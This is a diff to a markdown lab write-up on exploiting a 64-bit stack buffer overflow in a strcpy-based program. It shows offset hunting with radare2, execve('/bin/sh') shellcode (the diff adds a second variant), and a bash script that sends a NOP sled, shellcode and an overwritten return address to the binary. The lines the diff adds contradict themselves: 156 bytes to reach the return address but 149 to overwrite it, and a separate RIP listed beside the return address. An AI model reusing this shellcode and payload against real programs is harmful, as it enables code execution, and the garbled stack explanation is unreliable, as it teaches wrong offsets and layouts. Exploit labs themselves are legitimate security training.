@@ -931,10 +931,9 @@ int main(int argc, char **argv)
 }
 ```
 
-In this example, `strcpy` function (within the `copy_arg` function) copies input from a string `argv[1]`,  which is a command line argument, to a buffer of length 140 bytes. 
+In this example, `strcpy` function (within the `copy_arg` function) copies input from a string `argv[1]`,  which is a command line argument, to a buffer of length 140 bytes.  
 `strcpy` does not check the length of the data being input making it possible to overflow the buffer.
 Something more malicious is possible.  
-Let’s take a look at what the stack will look like for the copy_arg function(this stack excludes the stack frame for the strcpy function): 
 
 ### The Stack Frame  
 
@@ -1046,6 +1045,9 @@ Know that we know we can control the flow of execution by directing the return a
 An example shellcode that opens up a basic shell:
 `\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05`
 
+There is a simpler option using only 23 bytes:  
+`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`
+
 The basic idea is that we need to point the overwritten return address to the shellcode, but where do we actually store the shellcode and what actual address do we point it at?  
 Why don’t we store the shellcode in the buffer - because we know the address at the beginning of the buffer, we can just overwrite the return address to point to the start of the buffer. 
 Here’s the general process so far:
@@ -1073,37 +1075,26 @@ You’ve probably noticed that shellcode, memory addresses and NOP sleds are usu
 
 **Task 8 Code**  
 
-```c
-#include <stdio.h>                                              
-#include <stdlib.h>                                             
-                                                                
-void copy_arg(char *string)                                     
-{                                                               
-    char buffer[140];                                           
-    strcpy(buffer, string);                                     
-    printf("%s\n", buffer);                                     
-    return 0;                                                   
-}                                                                         
-int main(int argc, char **argv)                                 
-{                                                               
-    printf("Here's a program that echo's out your input\n");    
-    copy_arg(argv[1]);                                          
-}   
-```
-
-
 **So Far**  
 
 - The buffer is 140 bytes
 - The 64-bit architecture uses an 8-byte base pointer (rbp)
-- The minimum overflow length is 148 bytes to reach the return address and 149 bytes to begin overwriting the return address
+- There will also be an 8-byte instruction pointer
+- The minimum overflow length is 156 bytes to reach the return address and 149 bytes to begin overwriting the return address
+
+The Expected memory space looks like
+
+```md
+[140-byte buffer][8-byte RBP][8-byte RIP][8-byt return address]
+```
+
 
 #### Find the Segmentation Error
 
 First, attempt to identify the overflow point:
 
 ```bash
-python -c "print('\x41' * 148)" | ./buffer-overflow
+python -c "print('\x41' * 157)" | ./buffer-overflow
 ```
 
 This commmand fails
@@ -1125,27 +1116,12 @@ $ ./program ARGUMENT_HERE
 //         This becomes argv[1]
 ```
 
-`:> /buffer-overflow $(python -c "print('\x41'*144)")` causes the segementation error. However, this seems like it's too soon, based on the previously identified known information. We shouldn't see the segmentation error prior to `149`.
-
-The previously stated known information assumes the stack looks like:  
-
-```md
-[140-byte buffer][8-byte rbp][return address]
-```
-
-The early fault indicates there is a different memory layout. It's possible the compiler allocated less space than expected at some point.  
-
-It's possible, also, there is some alignment padding added by the compiler, making the stack look:
-
-```md
-[140-byte buffer][alignment padding (4 bytes?)][8-byte rbp][return address]
-```
-
- 
+`:> /buffer-overflow $(python -c "print('\x41'*144)")` causes the segementation error. However, this is much earlier than expected.  
 
 #### Examine the flow
 
-Since we started in debug mode, radare starts at the entry point instead of main().
+Start radare2 in  debug mode: `:> r2 -d ./buffer-overflow`  
+radare starts at the entry point instead of main().  
 
 Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' main()
 
@@ -1302,7 +1278,8 @@ rflags = 0x00000206
 orax = 0xffffffffffffffff
 
 ```
-We can find the exact offset by querying the pattern at `rbp`: `ragg2 -q 0x4179414178414177 ` 
+
+We can find the exact offset by querying the pattern at `rbp`:  
 
 ```md
 [0x00400563]> ragg2 -q 0x4179414178414177
@@ -1310,6 +1287,7 @@ Little endian: 144
 Big endian: -1
 [0x00400563]>
 ```
+
 `rbp` is 8 bytes, which takes us to 151.  
 the Saved Return Address, then, begins at 152 bytes.  
 
@@ -1449,7 +1427,7 @@ The original math indicated `ret` would be overwritten at 149 bytes. This turned
 
 returning to, and adjusting, the model above:  
 ```md
-[140-byte buffer][alignment padding (4 bytes?)][8-byte rbp][8-byte rsp][6-byte return address]
+[140-byte buffer][alignment padding (4 bytes?)][8-byte rbp][8-byte rip][6-byte return address]
 ```
 
 Experiment with a bash script:  
@@ -1473,7 +1451,7 @@ fi
 NUM_NOPS=$USER_NUM_NOPS
 echo "Using $NUM_NOPS NOPs"
 
-S_CODE='\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'
+S_CODE='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 NUM_JUNK=12
 # adjust the return address to ensure the return lands within the NOPS
 RET_OVER='\x88\xe2\xff\xff\xff\x7f\'
@@ -1484,6 +1462,3 @@ RET_OVER='\x88\xe2\xff\xff\xff\x7f\'
 # Ensure you have compiled the C code first using "gcc buffer-overflow.c -o buffer-overflow" and disabled security features like ASLR if needed.
 ./buffer-overflow $(python -c "print '\x90'*$NUM_NOPS + '$S_CODE' + '\x90'*$NUM_JUNK + '$RET_OVER'")
 ```  
-
-where NUM_NOPS is expected to be 112
-
